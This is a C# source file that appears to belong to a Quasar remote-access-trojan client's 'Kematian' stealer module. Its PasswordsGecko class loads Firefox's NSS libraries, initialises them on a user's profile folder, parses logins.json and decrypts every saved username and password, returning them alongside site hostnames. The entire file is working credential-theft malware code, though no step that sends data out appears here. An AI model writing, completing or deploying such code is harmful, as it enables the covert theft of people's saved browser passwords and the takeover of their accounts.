﻿using Quasar.Client.Helper;
using Quasar.Client.Kematian.Browsers.Helpers.Structs;
using Quasar.Client.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;

namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
{
    public class PasswordsGecko : IDisposable
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;

        private string nsspath;

        public long Init(string configDirectory)
        {
            string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");

            if (!Directory.Exists(mozillaPath))
            {
                Debug.WriteLine("Mozilla Firefox not found.");
                return -1;
            }

            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            NSS3 = NativeMethods.LoadLibrary(nsspath);
            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
            long result = -1;
            try
            {
                result = NSS_Init(configDirectory);
            }
            catch (Exception)
            {
                return -1;
            }
            return result;
        }

        public string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(cypherText);

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        public IEnumerable<string> SafeEnumerateDirectories(string path)
        {
            var directories = new List<string>();
            try
            {
                foreach (var dir in Directory.EnumerateDirectories(path))
                {
                    directories.Add(dir);

                    // Recursively enumerate subdirectories
                    try
                    {
                        directories.AddRange(SafeEnumerateDirectories(dir));
                    }
                    catch (UnauthorizedAccessException)
                    {
                        //Debug.WriteLine("Unauthorized access to directory: " + dir);
                    }
                    catch (PathTooLongException)
                    {
                        // Skip directories with paths that are too long
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                //Debug.WriteLine(path);
            }
            catch (PathTooLongException)
            {
                // Skip root-level directories with paths that are too long
            }
            return directories;
        }

        public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signins_path = "")
        {
            //TODO: FIX NSS3.DLL SEARCHING AND HOW IT'S USED. WRONG ONE == CAN'T DECRYPT.
            var logins = new List<LoginData>();

            if (!File.Exists(loginJsonPath))
            {
                Debug.WriteLine("Logins.json not found.");
                return logins;
            }

            if (nsspath == null)
            {
                nsspath = GetNSS3Path();
            }

            if (Init(profilePath) != 0)
            {
                Debug.WriteLine("Failed to initialize NSS.");
                return logins;
            }
            FFLogins ffLoginData;
            using (var sr = File.OpenRead(loginJsonPath))
            {
                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
            }
            foreach (Login loginData in ffLoginData.Logins)
            {
                string username = Decrypt(loginData.EncryptedUsername);
                string password = Decrypt(loginData.EncryptedPassword);

                logins.Add(new LoginData(loginData.Hostname.ToString(), username, password));
            }

            return logins;
        }

        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                NSS_Shutdown();
                NativeMethods.FreeLibrary(NSS3);
                NativeMethods.FreeLibrary(Mozglue);
            }
        }
        public string GetNSS3Path()
        {
            string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            var directories = SafeEnumerateDirectories(programFiles);

            foreach (var directory in directories)
            {
                var nss3Path = Path.Combine(directory, "nss3.dll");
                if (File.Exists(nss3Path))
                {
                    return nss3Path;
                }
            }

            return string.Empty;
        }
    }
}
